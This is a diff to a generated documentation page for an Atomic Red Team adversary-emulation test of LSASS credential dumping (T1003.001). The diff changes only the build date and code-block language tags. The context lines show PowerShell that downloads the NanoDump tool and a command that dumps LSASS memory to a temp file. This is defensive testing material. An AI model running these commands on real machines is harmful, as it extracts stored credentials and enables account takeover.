@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.001"
 attack_technique_name: "OS Credential Dumping: LSASS Memory"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "dddd4aca-bbed-46f0-984d-e4c5971c51ea"
@@ -48,13 +48,13 @@ NanoDump executable must exist on disk at specified location (PathToAtomicsFolde
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"
@@ -67,13 +67,13 @@ Invoke-WebRequest "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131
 
 ### Command
 
-```commandprompt
+```cmd
 PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del "%temp%\nanodump.dmp" >nul 2> nul
 ```
 
